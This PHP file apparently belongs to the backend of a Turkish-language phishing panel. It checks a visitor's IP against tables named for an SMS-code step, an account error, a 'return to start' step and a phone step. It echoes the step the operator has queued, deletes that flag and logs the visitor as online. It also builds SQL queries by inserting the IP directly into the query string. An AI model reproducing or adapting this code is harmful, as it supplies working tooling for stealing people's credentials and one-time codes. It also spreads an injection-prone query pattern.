<?php

include_once("config.php");
include_once("./admin/Data/Server/GrabIP.php");

$sms = $pdo->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach ($sms as $row1)
{
    if ($row1['sms'] == $ip)
    {
        echo 'sms';
        $pdo->query("DELETE FROM sms WHERE sms='$ip'");
    }
}

$tebrikler = $pdo->query("SELECT * FROM tebrikler", PDO::FETCH_ASSOC);
foreach ($tebrikler as $row2)
{
    if ($row2['tebrikler'] == $ip)
    {
        echo "tebrikler";
        $pdo->query("DELETE FROM tebrikler WHERE tebrikler='$ip'");
    }
}

$hata_sms = $pdo->query("SELECT * FROM hata_sms", PDO::FETCH_ASSOC);
foreach ($hata_sms as $row3)
{
    if ($row3['hata_sms'] == $ip)
    {
        echo "hata_sms";
        $pdo->query("DELETE FROM hata_sms WHERE hata_sms='$ip'");
    }
}

$hata_hesap = $pdo->query("SELECT * FROM hata_hesap", PDO::FETCH_ASSOC);
foreach ($hata_hesap as $row4)
{
    if ($row4['hata_hesap'] == $ip)
    {
        echo "hata_hesap";
        $pdo->query("DELETE FROM hata_hesap WHERE hata_hesap='$ip'");
    }
}

$bildirim = $pdo->query("SELECT * FROM bildirim", PDO::FETCH_ASSOC);
foreach ($bildirim as $row5)
{
    if ($row5['bildirim'] == $ip)
    {
        echo "bildirim";
        $pdo->query("DELETE FROM bildirim WHERE bildirim='$ip'");
    }
}

$basa_dondur = $pdo->query("SELECT * FROM basa_dondur", PDO::FETCH_ASSOC);
foreach ($basa_dondur as $row6)
{
    if ($row6['basa_dondur'] == $ip)
    {
        echo "basa_dondur";
        $pdo->query("DELETE FROM basa_dondur WHERE basa_dondur='$ip'");
    }
}

$telefon = $pdo->query("SELECT * FROM telefon", PDO::FETCH_ASSOC);
foreach ($telefon as $row7)
{
    if ($row7['telefon'] == $ip)
    {
        echo "telefon";
        $pdo->query("DELETE FROM telefon WHERE telefon='$ip'");
    }
}


if ($_GET['ip'])
{
    $timex = time() + 7;
    $pdo->query("UPDATE logs SET onlineTimer = '$timex' WHERE ip = '$ip'");

    $query = $pdo->query("SELECT * FROM cevrimici_tablosu WHERE ip = '$ip'")->fetch(PDO::FETCH_ASSOC);
    if ($query)
    {
        $pdo->query("UPDATE cevrimici_tablosu SET onlineTimer = '$timex' WHERE ip = '$ip'");
    }
    else
    {
        $query = $pdo->prepare("INSERT INTO cevrimici_tablosu SET ip = ?, onlineTimer = ?");
        $insert = $query->execute(array($ip, $timex));
    }
}
?>